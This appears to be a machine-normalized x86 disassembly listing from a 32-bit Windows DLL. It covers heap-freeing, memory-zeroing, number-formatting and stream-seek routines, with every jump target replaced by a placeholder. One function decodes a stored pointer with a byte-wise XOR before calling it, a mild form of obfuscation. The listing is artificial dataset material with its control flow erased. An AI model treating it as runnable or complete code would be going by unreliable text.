jmp r-xdata
sub_10037100
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
mov ebx 0xfffffffc
lea ecx [ ecx ]
mov edi [ esi + 0x18 ]
cmp edi [ esi + 0x1c ]
je r-xdata
lea ebx [ ebx ]
mov ecx [ esi + 0x1c ]
mov eax [ esi + 0x18 ]
cmp eax ecx
je r-xdata
mov edx [ edi + 0x1c ]
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add edi 0x24
cmp edi [ esi + 0x1c ]
jne r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
cmp eax 0x6
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
push ecx
call sub_10005bd0
mov ebx [ esi + 0x1c ]
add esp 0x8
mov [ ebp - 0x4 ] eax
mov edi eax
cmp eax ebx
je r-xdata
mov ecx [ esi + 0x8 ]
lea eax [ edi + 0x4 ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push edi
call sub_10077d10
add esp 0xc
add [ esi + 0x8 ] ebx
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x1
call eax
add edi 0x4
cmp edi ecx
jne r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x14 ]
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x1c ] eax
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov edi [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
cmp edi ecx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x48 ]
cmp eax 0x4
je r-xdata
mov edx [ esi + 0x14 ]
push edx
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] ebx
test ebx ebx
jne r-xdata
push edi
call sub_10016870
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
add edi 0x24
cmp edi ebx
jne r-xdata
mov eax [ edi ]
push eax
call sub_10065045
mov eax [ ebp - 0x4 ]
add esp 0x4
sub_10037225
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_100372e0
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x94
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1001c310
mov eax esi
mov esp ebp
pop ebp
retn
sub_10037310
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x10 ]
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
call sub_1000fdc0
add esp 0xc
test eax eax
jne r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
mov [ ebp - 0x4 ] 0x4
test [ ebp + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x8 ]
push edx
push ebx
mov edx esi
mov ecx edi
call sub_1004ba90
add esp 0x8
test eax eax
jne r-xdata
test [ ebp + 0x8 ] 0x8
je r-xdata
push ebx
push edi
mov ecx esi
call sub_10051410
add esp 0x8
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0x10
mov eax [ ebp + 0x8 ]
push eax
push ebx
mov ecx esi
mov edx edi
call sub_100027c0
add esp 0x8
test eax eax
jne r-xdata
push ebx
mov edx esi
mov ecx edi
call sub_10030060
add esp 0x4
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0x20
mov ecx [ ebp + 0x8 ]
push ecx
push ebx
mov ecx esi
mov edx edi
call sub_10038c70
add esp 0x8
test eax eax
mov eax [ ebp - 0x4 ]
jne r-xdata
or [ ebp - 0x4 ] 0x1
or [ ebp - 0x4 ] 0x8
pop edi
mov esp ebp
pop ebp
retn
or eax 0x2
sub_100373d0
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x6c ] edi
call sub_100400c0
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x5c ]
push edx
mov [ ebp - 0x5c ] ebx
mov ecx [ eax ]
push esi
push eax
mov eax [ ecx + 0xdc ]
call eax
push esi
mov edi eax
call [ LocalFree@IAT ]
cmp edi ebx
jge r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x68 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x68 ]
cmp eax ebx
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
xor esi esi
cmp eax esi
jle r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x4e
call sub_1000a6f0
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x60 ]
push edx
mov [ ebp - 0x60 ] esi
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ ebp - 0x60 ]
cmp ecx esi
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x133
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x64 ] esi
call sub_100453f0
test eax eax
je r-xdata
inc ebx
cmp ebx [ ebp - 0x68 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0x64 ]
mov edi [ ebp - 0x6c ]
push esi
add edi 0x130
call sub_1002f7d0
test esi esi
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx esi
je r-xdata
mov eax [ ebp - 0x60 ]
xor esi esi
cmp eax esi
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x6b
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
call sub_1000a6f0
sub_10037533
push 0x4c
mov eax sub_1007e636
call sub_10007703
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x44 ] eax
movzx eax [ ebp + 0x1c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x50 ]
push eax
mov ecx edi
mov [ ebp - 0x48 ] ebx
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_10018820
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
call sub_1002a730
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1002a674
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x38 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
cmp [ edi + 0x24 ] 0x0
mov eax [ edi + 0x20 ]
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x38 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
and [ ebp - 0x30 ] 0x0
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x38 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x40 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x58 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_10002dcf
mov ecx [ eax ]
push [ ebp - 0x30 ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x3c ]
xor esi esi
push eax
push ecx
push [ ebp - 0x44 ]
mov [ ebp + 0x14 ] eax
push ebx
mov [ edi + 0x20 ] esi
mov [ edi + 0x24 ] esi
call sub_10017235
add esp 0x34
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
mov eax [ ebp - 0x44 ]
call sub_10019c00
retn
cmp eax 0x100
lea eax [ ebp - 0x4c ]
je r-xdata
cmp eax [ ebp - 0x34 ]
jbe r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push [ ebp - 0x38 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_1000a6a2
mov ecx [ eax ]
push [ ebp - 0x30 ]
add esi [ ebp - 0x38 ]
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x38 ]
push [ eax ]
sub [ ebp - 0x34 ] ecx
lea eax [ ebp - 0x4c ]
push eax
push ebx
call sub_10017235
add esp 0x30
push [ ebp - 0x30 ]
push [ ebp - 0x3c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_10017235
add esp 0x18
jmp r-xdata
sub eax [ ebp - 0x34 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov ecx [ eax ]
and [ ebp - 0x30 ] 0x0
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ edi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov ebx [ ebp - 0x34 ]
jmp r-xdata
test al al
jle r-xdata
mov ebx [ ebp - 0x48 ]
mov ecx ebx
sub ecx [ ebp - 0x38 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub ebx eax
mov eax [ ebp - 0x34 ]
sub eax ebx
inc eax
push eax
lea ecx [ esi + ebx ]
push ecx
push eax
lea eax [ esi + ebx + 0x1 ]
push eax
mov [ ebp - 0x54 ] ecx
call sub_1000efa2
mov eax [ ebp - 0x54 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x30 ]
add esp 0x10
inc [ ebp - 0x34 ]
inc eax
cmp [ eax ] 0x0
jle r-xdata
mov [ ebp - 0x30 ] eax
sub_10037740
push ebp
mov ebp esp
sub esp 0x14
mov edx [ rw-data ]
mov ecx [ ebp + 0xc ]
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov al 0x38
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x4 ] ecx
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x8
sub_10037788
push 0xe0
mov eax sub_1007eab5
call sub_10007703
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] eax
movzx eax [ ebp + 0x1c ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x94 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x14 ] bl
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10015a9a
pop ecx
mov edi eax
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xa8 ]
push eax
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001b8c7
mov edi eax
pop ecx
mov [ ebp - 0x88 ] edi
lea ecx [ ebp - 0xa8 ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
sub eax [ ebp + 0x34 ]
push esi
inc eax
push eax
push ebx
lea ecx [ ebp + 0x24 ]
call sub_1005805f
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_1002a730
add esi 0x8
push esi
push ebx
push 0x30
call sub_1005e05a
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
mov [ ebp - 0x98 ] esi
call sub_1002a674
mov eax [ edi ]
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x8c ] eax
cmp [ ebp + 0x34 ] eax
ja r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
and [ ebp - 0x1c ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x20 ] 0x0
mov esi [ ebp - 0x88 ]
mov eax [ esi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx esi
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_10039e87
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_100171f8
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov edi [ ebp - 0x8c ]
xor bl bl
xor edx edx
xor ecx ecx
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
call sub_10020962
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_10051390
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x7
call sub_10024aa0
push eax
lea ecx [ ebp - 0x2c ]
call sub_10051390
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_10024aa0
and [ ebp - 0x54 ] 0x0
xor eax eax
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov eax [ ebp - 0x90 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x34 ] 0x10
mov edi [ ebp - 0x48 ]
movzx ebx ax
jae r-xdata
inc edx
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x34 ]
sub esi [ ebp - 0x8c ]
jmp r-xdata
lea edi [ ebp - 0x48 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov bl 0x1
add edx [ ebp - 0x54 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x84 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x90 ]
cmp [ ecx + 0x24 ] 0x0
mov eax [ ecx + 0x20 ]
jl r-xdata
add edx [ ebp - 0x1c ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor esi esi
jg r-xdata
cmp [ ebp + 0x34 ] edi
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
xor ebx ebx
cmp eax 0x100
jne r-xdata
cmp eax edx
jbe r-xdata
test eax eax
je r-xdata
xor eax eax
mov eax edi
sub eax [ ebp + 0x34 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push ebx
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_1005805f
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x94 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x9c ] eax
call sub_1002836c
mov eax [ ebp - 0xa0 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001f2a8
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
test bl bl
jne r-xdata
sub eax edx
mov esi eax
jmp r-xdata
xor esi esi
cmp esi edi
sbb esi esi
neg esi
add esi [ ebp + 0x34 ]
add esi eax
add edx esi
jmp r-xdata
mov edi eax
inc ebx
cmp ebx 0x4
jb r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001f2a8
add esp 0x14
xor esi esi
cmp [ ebp - 0x50 ] 0x8
mov eax [ ebp - 0x64 ]
jae r-xdata
sub eax 0x7
je r-xdata
mov eax ecx
mov eax [ eax + 0x14 ]
and eax 0x1c0
mov [ ebp - 0x8c ] eax
cmp eax 0x40
je r-xdata
movsx eax [ ebp + ebx - 0x84 ]
sub eax 0x20
je r-xdata
cmp [ ebp - 0x1c ] 0x1
jbe r-xdata
push [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xe4 ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x90 ]
push esi
push [ ebp - 0x94 ]
xor edi edi
push [ ebp + 0x10 ]
mov [ eax + 0x20 ] edi
push [ ebp + 0xc ]
mov [ eax + 0x24 ] edi
push [ ebp - 0xa4 ]
call sub_1001f2a8
add esp 0x14
xor esi esi
push edi
inc esi
push esi
lea ecx [ ebp - 0x64 ]
call sub_10024aa0
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10024aa0
push edi
push esi
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
push edi
push esi
lea ecx [ ebp + 0x24 ]
call sub_10024aa0
mov eax [ ebp - 0xa4 ]
call sub_10019c00
retn 0x38
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
test edi edi
jne r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ebp - 0x1c ]
add eax 0x2
dec ecx
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0xc ]
push eax
call sub_10012101
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
push 0x1
push eax
lea eax [ ebp - 0xec ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp + 0x34 ] edi
ja r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
cmp [ ebp - 0x8c ] 0x100
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
push [ ebp - 0x98 ]
lea ecx [ ebp + 0xc ]
call sub_1002836c
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_1002836c
mov eax edi
sub eax [ ebp + 0x34 ]
push eax
push [ ebp - 0x98 ]
lea eax [ ebp - 0xd4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001f2a8
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x14
cmp [ ebp + 0x38 ] 0x8
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x24 ]
jae r-xdata
push [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xbc ]
lea eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xcc ]
push [ ebp + 0xc ]
push eax
call sub_10012101
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x88 ]
mov [ ebp + 0x10 ] eax
mov eax [ ecx ]
add esp 0x14
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_1002836c
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
lea eax [ ebp + 0x24 ]
push [ ebp + 0x34 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xc4 ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
lea eax [ eax + ecx * 2 ]
push edi
push eax
lea eax [ ebp - 0xdc ]
jmp r-xdata
lea eax [ ebp + 0x24 ]
push eax
call sub_10012101
add esp 0x14
jmp r-xdata
sub_10037d30
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
cmp [ eax + 0x1 ] 0x2f
push edi
lea edi [ eax + 0x1 ]
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
mov eax [ esi + 0x4 ]
add eax edi
mov [ esi ] edi
cmp edi eax
je r-xdata
add eax 0x2
add [ esi + 0x4 ] 0xfffffffd
pop edi
mov [ esi ] eax
pop esi
pop ebp
retn
pop edi
movsx eax [ edi ]
push eax
call sub_1004ba5c
add esp 0x4
test eax eax
jne r-xdata
sub edi [ esi ]
mov [ esi + 0x4 ] edi
cmp [ edi ] 0x2f
je r-xdata
mov ecx [ esi ]
add ecx [ esi + 0x4 ]
inc edi
cmp edi ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_10037d90
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
push ebx
mov bl [ ebp + 0x18 ]
push esi
push edi
test bl 0x1
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test bl 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov ecx esi
or ecx ebx
je r-xdata
mov eax [ edx ]
mov [ ebp + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov esi [ r--data ]
mov ebx [ r--data ]
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test edx edx
je r-xdata
test bl 0x2
jne r-xdata
test ebx ebx
jl r-xdata
test edx edx
je r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
jg r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
jg r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
jl r-xdata
jl r-xdata
sub edi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x18 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ ebp + 0x18 ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_10037f49
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x6
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
